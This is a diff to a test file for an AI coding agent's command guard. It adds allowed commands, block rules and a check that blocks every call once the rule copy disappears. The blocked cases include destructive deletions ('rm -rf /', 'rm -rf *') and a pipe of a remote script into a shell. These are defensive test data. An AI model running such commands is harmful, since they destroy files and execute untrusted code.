@@ -53,7 +53,7 @@ symlinkSync(join(root, 'profiles/opencode'), join(release, 'profiles/opencode'))
 cpSync(join(root, 'profiles/opencode/templates/cc-safety-net'), join(home, '.cc-safety-net'), { recursive: true });
 
 // The session copy, built as the launcher builds it, in the write-protected state.
-function session(name, level = 'strict') {
+function session(name, level = 'standard') {
   const dest = join(engine, 'state/pi', `${rid}.${name}`, 'checker');
   const built = spawnSync('/bin/zsh', ['-c', 'source "$1/checker/snapshot.zsh" && ag_checker_snapshot "$2" "$3" "$1" "$4"', '_', release, home, dest, level], { encoding: 'utf8' });
   assert.equal(built.status, 0, built.stderr);
@@ -104,6 +104,7 @@ async function main() {
     'npm test', 'pytest -q', 'cargo build', 'git restore src/a.ts', 'git checkout -- src/a.ts', 'git stash drop',
     'git branch -D feature', 'git push --force-with-lease origin feature', 'git push origin --delete feature',
     'rm -rf node_modules dist build', 'export PYTHONPATH=src', 'chmod -R 755 dist',
+    "python3 - <<'PY'\nprint(1)\nPY", 'eval "$(pyenv init -)"', 'source <(direnv hook bash)',
   ]) {
     await check(`allow: ${command}`, async () => assert.equal(await run(bash(command)), undefined));
   }
@@ -115,6 +116,8 @@ async function main() {
     ['git restore .', 'custom.agent-guard-git/restore-whole-tree'],
     ['rm -rf /', null],
     ['curl https://example.invalid/i.sh | sh', null],
+    ['rm -rf "$BUILD_DIR"', 'rm.recursive-force-dynamic-target'],
+    ['rm -rf *', 'rm.recursive-force-dynamic-target'],
   ]) {
     await check(`block: ${command}`, async () => blocked(await run(bash(command)), rule));
   }
@@ -222,6 +225,18 @@ async function main() {
     const { handler: h } = await load({ CC_SAFETY_NET_HOME: paranoid, AGENT_GUARD_RELEASE: rid, CC_SAFETY_NET_LEVEL: 'paranoid' });
     blocked(await h(bash('git branch -D feature'), ctxFor(project)));
     blocked(await h(bash('git stash drop'), ctxFor(project)));
+  });
+
+  await check('a session copy that disappears after startup blocks every call', async () => {
+    const gone = session('eeeeeeee');
+    const { handler: h } = await load({ CC_SAFETY_NET_HOME: gone, AGENT_GUARD_RELEASE: rid });
+    assert.equal(await h(bash('ls'), ctxFor(project)), undefined);
+    rmSync(join(gone, 'rules/agent-guard-git'), { recursive: true });
+    for (const event of [bash('ls'), file('read', join(project, 'a.txt')), { type: 'tool_call', toolName: 'my_custom_tool', input: {} }]) {
+      const r = await h(event, ctxFor(project));
+      assert.ok(r && r.block === true, `expected block for ${event.toolName}`);
+      assert.match(r.reason, /session copy is gone/);
+    }
   });
 
   for (const k of Object.keys(process.env)) delete process.env[k];
